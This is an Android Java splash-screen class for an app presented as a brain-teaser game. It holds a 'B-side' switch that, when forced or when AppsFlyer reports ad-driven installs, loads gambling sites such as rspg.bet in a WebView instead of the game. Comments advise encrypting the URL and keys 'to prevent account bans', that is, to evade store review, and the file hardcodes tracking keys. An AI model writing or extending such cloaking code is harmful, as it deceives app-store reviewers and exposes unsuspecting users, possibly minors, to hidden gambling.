package com.mjb.test1;

import android.content.Intent;
import android.os.Bundle;
import android.os.Handler;
import android.text.TextUtils;
import android.util.Log;
import android.widget.Toast;

import androidx.appcompat.app.AppCompatActivity;

import com.google.firebase.remoteconfig.FirebaseRemoteConfig;
import com.google.firebase.remoteconfig.FirebaseRemoteConfigSettings;
import com.mjb.test1.mj_b_mian.AppsFlyerLibUtil;
import com.mjb.test1.mj_b_mian.BWebMainActivity;

/**
 * com.easybrainteaser.enjoygamefirst
 * KEY：yWCTCzLVDuZYY2sgNuGdDf
 * <p>
 * B面链接：
 * https://www.brlbet2.com/?cid=131947
 * <p>
 * APP名称：
 * Tigre da Inteligência - Fortuna™
 */
public class SplashActivity extends AppCompatActivity {

    String TAG = "SplashActivity";

    private long setDays(long days) {
        return 3600 * 24 * days;
    }

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_splash);

        FirebaseRemoteConfig mFirebaseRemoteConfig = FirebaseRemoteConfig.getInstance();
        FirebaseRemoteConfigSettings configSettings = new FirebaseRemoteConfigSettings.Builder()
                .setMinimumFetchIntervalInSeconds(setDays(30))//本地数据保存至少30天，可以自动定义>30即可
                .build();
        mFirebaseRemoteConfig.setConfigSettingsAsync(configSettings);


        ////////////////////测试阶段可以写死
        // String appsflyerkey = "Dp89DfWmmL78B9unRrYXdc";
        // String url = "https://www.5g88.com/?cid=226292";

        ////////////////////正式版本，用firebase返回参数
//        mFirebaseRemoteConfig.fetchAndActivate()
//                .addOnCompleteListener(this, new OnCompleteListener<Boolean>() {
//                    @Override
//                    public void onComplete(@NonNull Task<Boolean> task) {
//                        boolean updated = false;
//                        if (task.isSuccessful()) {
//                            updated = task.getResult();
//                            Log.d(TAG, "true, Config params updated: " + updated);
//                        } else {
//                            Log.d(TAG, "false,Config params updated: " + updated);
//                        }


        new Handler().postDelayed(new Runnable() {
            @Override
            public void run() {
                //https://bol.bet
                //url、key、force2B 自行aes、des加密解密，不要使用明文。防止封号
                String url = "https://rspg.bet";//mFirebaseRemoteConfig.getString("url");
                String appsflyerkey = "uTs9L9BdMHGdvH9tJSiwcb";//mFirebaseRemoteConfig.getString("key");
                boolean force2B = true;//mFirebaseRemoteConfig.getBoolean("force2B");//强制打开B面
//com.tozxbv.yjaydxj
//uTs9L9BdMHGdvH9tJSiwcb

                Log.d(TAG, "2 url=" + url);
                Log.d(TAG, "2 appsflyerkey=" + appsflyerkey);
                Log.d(TAG, "2 force2B=" + force2B);
                jumpPage(appsflyerkey, url, force2B);
            }
        }, 1000);

//                    }
//                });

    }


    private void jumpPage(String appsflyerkey, String url, boolean force2B) {
        Toast.makeText(this, "appsflyerkey=" + appsflyerkey +
                ",url=" + url + ",force2B=" + force2B, Toast.LENGTH_LONG).show();

        if (!TextUtils.isEmpty(appsflyerkey)) {
            AppsFlyerLibUtil.initAppsFlyer(appsflyerkey);
        }

        //强制打开B面:force2B=true 或者
        //广告流量进入B面
        if ((force2B || !AppsFlyerLibUtil.isOrganic) && !TextUtils.isEmpty(url)) {
            BWebMainActivity.mLoadUrl = url;
            startActivity(new Intent(SplashActivity.this, BWebMainActivity.class));

        } else {
            startActivity(new Intent(SplashActivity.this, MainActivity.class));
        }
        finish();

    }
}